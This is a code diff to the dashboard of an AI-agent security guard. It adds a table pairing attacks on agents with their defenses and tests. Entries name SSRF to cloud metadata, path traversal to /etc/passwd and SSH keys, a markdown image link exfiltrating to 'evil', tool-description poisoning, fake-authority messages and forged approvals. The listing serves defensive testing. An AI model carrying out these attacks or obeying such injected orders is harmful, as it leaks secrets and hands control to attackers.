@@ -306,7 +306,10 @@
         <p>A firewall is only useful if it can't be talked around, tricked or quietly edited. Each attack below has an automated test that runs offline.</p></div></div>
       <div class="plain"><b class="k">In plain words</b><span>Attackers don't only attack the AI; they also try to fool the guard. This page lists those tricks (disguising an account number, faking an approval, editing the policy file, rewriting the logs) and shows the automated test proving each one is stopped.</span></div>
       <div class="grid g3" id="defKpis"></div>
-      <div class="panel" style="margin-top:14px"><div class="tablewrap"><table id="defTable"></table></div></div>
+      <div class="panel" style="margin-top:14px"><div class="ph"><h3>Attacks on the shield, and their tests</h3><span class="sub">offline · python -m tests.test_self_defense</span></div><div class="tablewrap"><table id="defTable"></table></div></div>
+      <div class="panel" style="margin-top:14px"><div class="ph"><h3>Posture scan</h3><span class="sub">configuration audit before anything runs · python -m michael.scan</span></div><div class="pb" id="posture"></div></div>
+      <div class="panel" style="margin-top:14px"><div class="ph"><h3>Attack coverage map</h3><span class="sub">OWASP Agentic Top 10 · OWASP LLM Top 10 · MCP attacks · attacks on the shield</span></div>
+        <div class="pb" style="padding-bottom:6px"><div class="seg" id="covSeg"></div></div><div class="tablewrap"><table id="covTable"></table></div></div>
     </section>
 
     <section data-page="changes" class="hidden">
@@ -659,8 +662,39 @@ const DEFENSES = [
   ["obfuscation_is_decoded", "Obfuscated commands", "Base64 blobs, zero-width characters", "De-obfuscation before every detector"],
   ["manipulation_rules", "Split / fake authority", "a='Send x', b='to y', do a+b · “I'm the CFO, skip checks”", "Instant deterministic rules, checked against false alarms"],
   ["aadhaar_checksum", "Leak-guard precision", "Random 12-digit numbers flagged as Aadhaar", "UIDAI Verhoeff checksum validation"],
+  ["ascii_smuggling_decoded", "ASCII smuggling", "Orders written in invisible Unicode tag characters", "Tag characters decoded and flagged before any detector"],
+  ["ssrf_urls_blocked", "SSRF via fetch", "Agent asked to fetch 169.254.169.254, localhost, file://", "URL guard: internal, metadata and non-http targets refused"],
+  ["path_traversal_blocked", "Path traversal", "../../etc/passwd, ~/.ssh/id_rsa, *.pem", "Path guard: workspace only, credential files refused"],
+  ["markdown_exfiltration_stripped", "Zero-click exfiltration", "Answer contains ![img](https://evil/?d=SECRET)", "External images and data-carrying links stripped"],
+  ["tool_poisoning_rugpull_shadowing", "Tool poisoning / rug pull / shadowing", "Hidden <IMPORTANT> orders in a tool description, changed or duplicate tools", "Tool definitions pinned by hash and scanned; risky actions refused"],
+  ["loops_blocked", "Runaway loops", "Same call repeated, endless tool use", "Loop guard + tool-call cap per task"],
+  ["kill_switch_freezes_risky_actions", "Rogue agent", "Agent keeps acting after something goes wrong", "Kill switch freezes every risky action"],
+  ["only_signed_approvals_count", "Fake approvals", "“Approved by admin” in text or a forged token", "Only an HMAC signature over the exact action counts"],
 ];
+let COVF = "all";
+function renderCoverage() {
+  const cov = S.def?.coverage || [];
+  const lists = ["all", ...new Set(cov.map((c) => c.list))];
+  $("#covSeg").innerHTML = lists.map((l) => `<button data-l="${esc(l)}" class="${l === COVF ? "on" : ""}">${l === "all" ? "All" : esc(l)}</button>`).join("");
+  document.querySelectorAll("#covSeg button").forEach((b) => b.onclick = () => { COVF = b.dataset.l; renderCoverage(); });
+  const tag = (st) => st === "covered" ? `<span class="tag ok">COVERED</span>` : st === "partial" ? `<span class="tag warn">PARTIAL</span>` : `<span class="tag">OUT OF SCOPE</span>`;
+  const rows = cov.filter((c) => COVF === "all" || c.list === COVF);
+  const n = (st) => cov.filter((c) => c.status === st).length;
+  $("#covTable").innerHTML = `<tr><th>Risk</th><th>Michael-V1 defense</th><th>Evidence</th><th>Status</th></tr>` +
+    rows.map((c) => `<tr><td style="font-weight:600">${esc(c.risk)}<div class="mono muted" style="font-size:11px;font-weight:400">${esc(c.list)}</div></td><td>${esc(c.defense)}</td><td class="muted mono" style="font-size:12px">${esc(c.evidence)}</td><td>${tag(c.status)}</td></tr>`).join("") +
+    `<tr><td colspan="4" class="muted" style="font-size:12.5px">${n("covered")} covered · ${n("partial")} partial · ${n("out of scope")} out of scope (of ${cov.length})</td></tr>`;
+}
+function renderPosture() {
+  const r = S.def?.posture;
+  if (!r) { $("#posture").innerHTML = `<div class="empty">Run <code>python -m michael.scan</code></div>`; return; }
+  const col = r.grade === "A" ? "var(--ok)" : r.grade === "B" ? "var(--accent)" : r.grade === "C" ? "var(--warn)" : "var(--bad)";
+  $("#posture").innerHTML = `<div style="display:grid;grid-template-columns:auto 1fr;gap:20px;align-items:start">
+      <div style="text-align:center"><div style="font:700 52px/1 var(--sans);color:${col}">${esc(r.grade)}</div><div class="mono muted" style="font-size:12px;margin-top:4px">${r.score}/100</div></div>
+      <div>${r.findings.length ? r.findings.map((f) => `<div style="margin-bottom:8px"><span class="tag ${f.severity === "critical" || f.severity === "high" ? "bad" : f.severity === "medium" ? "warn" : ""}">${esc(f.severity.toUpperCase())}</span> ${esc(f.finding)}<div class="muted" style="font-size:12.5px;margin-top:2px">fix: ${esc(f.fix)}</div></div>`).join("") : `<div style="color:var(--ok);margin-bottom:8px">No findings.</div>`}
+      <div class="muted" style="font-size:12.5px">${r.defenses.map((d) => "✓ " + esc(d)).join(" · ")}</div></div></div>`;
+}
 function renderDefense() {
+  renderCoverage(); renderPosture();
   const res = S.def?.tests?.results || [], pol = S.def?.policy, passed = res.filter((r) => r.passed).length;
   $("#defKpis").innerHTML =
     kpi("Self-defense tests", res.length ? `${passed}<small> / ${res.length}</small>` : "-", "offline · python -m tests.test_self_defense", res.length && passed === res.length ? "up" : "down") +
